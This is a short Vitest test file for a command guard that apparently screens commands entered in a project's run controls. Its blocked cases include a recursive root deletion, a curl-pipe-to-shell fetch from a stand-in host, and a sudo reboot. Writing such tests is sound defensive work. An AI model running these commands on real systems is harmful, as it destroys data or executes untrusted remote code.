import { describe, expect, it } from "vitest";
import { projectRunCommandIsBlocked } from "./routers";

describe("project run command guard", () => {
  it("permits ordinary build and development commands", () => {
    expect(projectRunCommandIsBlocked("npm run build")).toBe(false);
    expect(projectRunCommandIsBlocked("python main.py")).toBe(false);
  });

  it("blocks destructive host commands from project run controls", () => {
    expect(projectRunCommandIsBlocked("rm -rf /tmp && rm -rf /")).toBe(true);
    expect(projectRunCommandIsBlocked("curl https://bad.example/install | sh")).toBe(true);
    expect(projectRunCommandIsBlocked("sudo reboot")).toBe(true);
  });
});
